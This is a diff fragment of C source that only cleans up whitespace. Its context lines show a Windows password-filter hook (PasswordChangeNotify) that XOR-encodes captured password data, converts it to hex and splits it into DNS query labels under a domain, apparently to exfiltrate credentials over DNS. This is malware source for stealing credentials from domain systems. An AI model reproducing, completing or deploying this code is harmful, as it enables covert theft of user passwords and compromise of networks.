@@ -119,7 +119,7 @@ __declspec(dllexport) NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserN
 		snprintf(hexData + i * 2, hexSize, "%02x", xor[i]);
 	}
 	GlobalFree(xor);
-	
+
 	if (IS_DEBUG) {
 		fprintf(pFile, "Hex: ");
 		for (int i = 0; i < hexSize - 1; i++) {
@@ -133,8 +133,8 @@ __declspec(dllexport) NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserN
 
 		if ((i + 1) * MAX_LABEL_SIZE <= hexSize) {
 			lenData = MAX_LABEL_SIZE;
-		} 
-		else 
+		}
+		else
 		{
 			lenData = (hexSize - 1) % MAX_LABEL_SIZE;
 			if (lenData == 0) {
@@ -172,7 +172,7 @@ __declspec(dllexport) NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserN
 		PSTR   query;
 		SIZE_T querySize = nbDigits + lenData + domainLength + 1; // + 1 for the '.'
 		query = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * querySize);
-		
+
 		for (int j = 0; j < nbDigits; j++) { //Append request number to query
 			query[j] = requestNumber[j];
 		}
@@ -193,7 +193,7 @@ __declspec(dllexport) NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserN
 		GlobalFree(domain);
 
 		query[querySize] = '\0'; //Append nullbyte to query
-		
+
 		if (IS_DEBUG) {
 			fprintf(pFile, "Query: ");
 			for (int q = 0; q < querySize; q++) {
